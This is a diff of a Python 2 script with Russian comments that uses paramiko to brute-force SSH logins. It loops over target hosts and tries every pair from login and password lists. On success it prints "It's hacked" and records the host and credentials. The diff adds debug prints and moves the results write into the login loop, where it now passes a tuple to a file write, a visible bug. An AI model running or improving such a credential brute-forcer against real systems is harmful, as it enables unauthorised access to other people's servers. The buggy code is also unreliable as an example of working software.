@@ -8,13 +8,13 @@ import os				# Необходимо для работы с форками
 import sys 				# Используется для красивого вывода
 
 # Открываем файлы
-targets = 	open('./targets.lst').readlines()
+targets = 	open('./targets.lst').readlines() # Большие файлы при таком использовании будут сжирать много памяти
 logins 	= 	open('./logins.lst').readlines()
 passwords =	open('./passwords.lst').readlines()
 results	=	open('./results.lst', 'w')	# Кроме того нужно сохранять все хосты к которые не удалось просканировать
 util.log_to_file('paramiko.log')	# Включаем логгирование в файл
 # Инициализируем SSH-клиент
-client = SSHClient()				# Создаём объект
+client = SSHClient()			# Создаём объект
 client.load_system_host_keys()		# Подгружаем ключи хостов, а если ключа не нашлось =>
 client.set_missing_host_key_policy(AutoAddPolicy()) # => добавляем автоматически
 
@@ -43,11 +43,15 @@ def child(target):	# Дочерний процесс
 			psw = psw.strip()
 			try:
 				client.connect(target, username = lgn, password = psw, timeout=2)
+				print "try 2"
 				stdin, stdout, stderr = client.exec_command('date')
-				print 'DEBUG:', stdout
+				print "try 3"
+				#print 'DEBUG:', stdout
 				print '!!! It\'s hacked', target, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
 				print lgn, psw, '\n'
-				res = target + lgn + psw
+				res = target, lgn, psw
+				print type(res)
+				results.write(res)
 				
 			except SSHException:
 				print 'Child:', '\t\t', os.getpid(), '\nTarget:', '\t', target, '\nWrong auth:', '\t', lgn, psw, '\n'
@@ -55,8 +59,8 @@ def child(target):	# Дочерний процесс
 				print "\nConnection refused to host", target, '\nGoing to next host\n\n'
 				error='yes'
 				break # skip host if it refused
-	print 'Exit and save'
-	results.write(res)
+	print '\n\nExit and save\n\n'
+	#results.write(res)
 	results.close()
 	os._exit(0)
 
